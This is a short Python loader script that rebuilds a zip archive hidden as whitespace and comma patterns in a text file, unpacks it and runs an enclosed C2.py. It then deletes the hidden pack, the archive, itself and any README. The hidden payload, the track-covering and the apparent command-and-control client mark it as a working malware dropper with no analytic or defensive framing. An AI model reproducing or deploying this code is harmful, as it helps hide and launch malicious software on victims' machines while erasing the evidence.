import pathlib
import os, shutil
import random
import sys
import urllib.request

def decode(bits, encoding='utf-8', errors='surrogatepass'):
    n = int(bits.replace(" ","0").replace("\t","1"), 2)
    return n.to_bytes((n.bit_length() + 7) // 8, 'big') or '\0'
    
def recover_file(input) :
    d = ""
    with open(input,"r") as f :
        for s in f.readlines() :
            d += "".join(i for i in s if i in [" ",","])
    return decode(d.replace(",","\t"))

with open("client.zip","wb") as o:
    o.write(recover_file("pack.txt"))

shutil.unpack_archive("client.zip","Client")
os.remove("pack.txt")
os.remove("client.zip")
os.remove("loader.py")
if os.path.exists("README.md") :
    os.remove("README.md")
python = sys.executable
print("start")

print(f"cd Client && \"{python}\" C2.py {" ".join(sys.argv)}")
os.system(f"cd Client && \"{python}\" C2.py {" ".join(sys.argv)}")
os.system("pause")